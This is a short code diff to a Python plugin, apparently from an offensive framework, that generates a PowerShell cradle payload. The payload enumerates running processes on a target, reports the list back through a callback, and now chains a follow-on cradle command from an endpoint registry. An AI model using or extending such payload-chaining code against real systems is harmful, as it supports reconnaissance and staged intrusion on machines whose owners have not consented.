@@ -8,12 +8,12 @@ class EnumProcessesPsSgr(BaseCradlePlugin):
     AUTHOR      = "CyberSecN00b"
 
     OPTIONS = {
-        **BaseCradlePlugin.OPTIONS,
         "ENUM_METHOD": {
             "description": "Enumeration Method: Get-CimInstance, Get-WmiObject, Get-Process (may not have command lines)",
             "default": "Get-CimInstance",
             "restricted_to": ["Get-CimInstance", "Get-WmiObject", "Get-Process"]
-        }
+        },
+        **BaseCradlePlugin.OPTIONS
     }
 
     def generate(self, inst: CradleInstance) -> str:
@@ -36,5 +36,12 @@ class EnumProcessesPsSgr(BaseCradlePlugin):
         payload.append(
             self.notification_callback_snippet(inst,{"proc_list":"$proc_list"})
         )
+
+        if self._endpoint_registry:
+            cradle_command = self._endpoint_registry.get_cradle_command(inst.options.get("NEXT_CRADLE",0))
+            if cradle_command:
+                payload.append(
+                    cradle_command
+                )
 
         return "\n".join(payload) + "\n"
